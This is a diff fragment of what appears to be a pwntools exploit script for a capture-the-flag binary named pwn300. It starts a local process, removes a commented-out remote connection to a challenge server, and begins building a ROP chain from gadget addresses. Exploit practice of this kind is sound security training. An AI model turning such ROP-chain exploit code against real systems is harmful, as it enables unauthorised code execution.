@@ -20,9 +20,6 @@ elf = ELF('/home/h11p/hackme/huxiangbei/pwn300')
 
 io = process('/home/h11p/hackme/huxiangbei/pwn300')
 
-#io = remote('104.224.169.128', 18887)
-
-
 p=[]
 
 p.append( 0x0806ed0a)  # pop edx ; ret
